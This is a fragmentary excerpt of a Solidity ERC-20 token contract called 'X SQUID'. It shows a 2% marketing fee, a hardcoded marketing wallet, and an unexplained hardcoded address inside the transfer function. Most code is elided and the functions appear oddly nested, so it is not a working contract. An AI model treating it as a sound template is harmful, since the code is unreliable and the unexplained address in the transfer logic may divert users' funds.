...
contract XSQUID is Context, IERC20, Ownable {
    ...
    string private constant _name = "X SQUID"; // 
    string private constant _symbol = "XSQUID"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xCaE2b99765385ac15143dfD64f78B0fe0D0adFCA;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x021e06E1A7f05CE0f2D7B0424A3b057dDC2e3F6F;
